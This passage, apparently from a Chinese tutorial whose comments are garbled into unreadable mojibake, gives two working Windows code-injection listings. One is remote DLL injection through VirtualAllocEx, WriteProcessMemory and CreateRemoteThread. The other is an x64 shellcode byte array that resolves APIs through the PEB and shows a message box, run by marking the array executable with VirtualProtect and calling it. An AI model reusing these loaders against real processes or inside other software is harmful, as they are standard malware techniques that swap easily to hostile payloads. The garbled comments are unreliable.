LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

// æ­¥éª¤ 3: å†™å…¥ DLL è·¯å¾„åˆ°è¿œç¨‹è¿›ç¨‹
WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);

// æ­¥éª¤ 4: è·å– LoadLibraryA çš„åœ°å€
LPVOID loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

// æ­¥éª¤ 5: åˆ›å»ºè¿œç¨‹çº¿ç¨‹
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
```

# ç›´æ¥ä¿®æ”¹åŸæ•°ç»„åœ°å€æ‰§è¡Œä»£ç 

```cpp
// ä¿®æ”¹å†…å­˜é¡µä¸ºå¯æ‰§è¡Œ-åœ¨æ•°ç»„æŒ‡é’ˆä¸Šæ‰§è¡ŒSHELLCODE.cpp : æ­¤æ–‡ä»¶åŒ…å« "main" å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚
//

#include <iostream>
#include <Windows.h>

int main()
{
    unsigned char data[] = {
    0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
    0x48, 0x83, 0xEC, 0x78, 0x45, 0x33, 0xC0, 0xC7, 0x45, 0xB0, 0x55, 0x53, 0x45, 0x52, 0x44, 0x88,
    0x45, 0xBA, 0xC7, 0x45, 0xB4, 0x33, 0x32, 0x2E, 0x44, 0x66, 0xC7, 0x45, 0xB8, 0x4C, 0x4C, 0xC7,
    0x45, 0xC0, 0x4D, 0x65, 0x73, 0x73, 0xC7, 0x45, 0xC4, 0x61, 0x67, 0x65, 0x42, 0xC7, 0x45, 0xC8,
    0x6F, 0x78, 0x41, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xD0,
    0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x45, 0xD4, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xD8, 0x61, 0x72,
    0x79, 0x41, 0x4C, 0x8B, 0x78, 0x18, 0x49, 0x83, 0xC7, 0x20, 0x44, 0x88, 0x45, 0xDC, 0xC7, 0x45,
    0xE0, 0x47, 0x65, 0x74, 0x50, 0xC7, 0x45, 0xE4, 0x72, 0x6F, 0x63, 0x41, 0xC7, 0x45, 0xE8, 0x64,
    0x64, 0x72, 0x65, 0x4D, 0x8B, 0x77, 0x08, 0x66, 0xC7, 0x45, 0xEC, 0x73, 0x73, 0x44, 0x88, 0x45,
    0xEE, 0x4C, 0x89, 0x45, 0x60, 0x4C, 0x89, 0x45, 0x58, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0x76, 0x20, 0x48, 0x63, 0x46, 0x3C, 0x48, 0x8B, 0x84, 0x30, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0xC8, 0x48, 0xC1, 0xE9, 0x20, 0x85, 0xC9, 0x0F, 0x84, 0xA1, 0x00, 0x00, 0x00, 0x8B, 0xC8, 0x44,
    0x89, 0x45, 0x48, 0x8B, 0x44, 0x31, 0x18, 0x89, 0x45, 0x50, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0x00,
    0x00, 0x00, 0x44, 0x8B, 0x64, 0x31, 0x24, 0x8B, 0x54, 0x31, 0x1C, 0x4C, 0x03, 0xE6, 0x44, 0x8B,
    0x6C, 0x31, 0x20, 0x4C, 0x03, 0xEE, 0x48, 0x89, 0x55, 0xA8, 0x41, 0x0F, 0xB7, 0x04, 0x24, 0x41,
    0x8B, 0x5D, 0x00, 0x48, 0x03, 0xDE, 0x48, 0x8D, 0x0C, 0x82, 0x48, 0x8B, 0xD3, 0x8B, 0x3C, 0x31,
    0x48, 0x8D, 0x4D, 0xD0, 0x48, 0x03, 0xFE, 0xE8, 0x90, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x48, 0x8B,
    0xCF, 0x48, 0x8B, 0xD3, 0x48, 0x0F, 0x44, 0x4D, 0x58, 0x48, 0x89, 0x4D, 0x58, 0x48, 0x8D, 0x4D,
    0xE0, 0xE8, 0x76, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x85, 0xC0, 0x48, 0x0F, 0x44, 0x7D, 0x60,
    0x48, 0x8B, 0xDF, 0x48, 0x89, 0x5D, 0x60, 0x48, 0x85, 0xFF, 0x74, 0x09, 0x48, 0x8B, 0x55, 0x58,
    0x48, 0x85, 0xD2, 0x75, 0x28, 0x8B, 0x45, 0x48, 0x49, 0x83, 0xC5, 0x04, 0x48, 0x8B, 0x55, 0xA8,
    0xFF, 0xC0, 0x49, 0x83, 0xC4, 0x02, 0x89, 0x45, 0x48, 0x3B, 0x45, 0x50, 0x72, 0x8C, 0x4D, 0x8B,
    0x76, 0x08, 0x4D, 0x3B, 0xF7, 0x0F, 0x85, 0x33, 0xFF, 0xFF, 0xFF, 0xEB, 0x1B, 0x48, 0x8D, 0x4D,
    0xB0, 0xFF, 0xD2, 0x48, 0x8D, 0x55, 0xC0, 0x48, 0x8B, 0xC8, 0xFF, 0xD3, 0x45, 0x33, 0xC9, 0x45,
    0x33, 0xC0, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0xD0, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F,
    0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0x44, 0x8A, 0x01, 0x33,
    0xC0, 0x4C, 0x8B, 0xDA, 0x44, 0x8B, 0xD0, 0x45, 0x84, 0xC0, 0x74, 0x0E, 0x4C, 0x8B, 0xC9, 0x49,
    0xFF, 0xC1, 0x41, 0xFF, 0xC2, 0x41, 0x38, 0x01, 0x75, 0xF5, 0x44, 0x8B, 0xC8, 0xEB, 0x06, 0x41,
    0xFF, 0xC1, 0x48, 0xFF, 0xC2, 0x38, 0x02, 0x75, 0xF6, 0x45, 0x3B, 0xD1, 0x75, 0x23, 0x8B, 0xD0,
    0x45, 0x84, 0xC0, 0x74, 0x16, 0x4C, 0x2B, 0xD9, 0x46, 0x3A, 0x04, 0x19, 0x75, 0x0D, 0x48, 0xFF,
    0xC1, 0xFF, 0xC2, 0x44, 0x8A, 0x01, 0x45, 0x84, 0xC0, 0x75, 0xED, 0x41, 0x3B, 0xD2, 0x0F, 0x94,
    0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    DWORD old;
    VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, &old);
    void* t = reinterpret_cast<void*>(data);
    ((void(*)())  t)();
}
```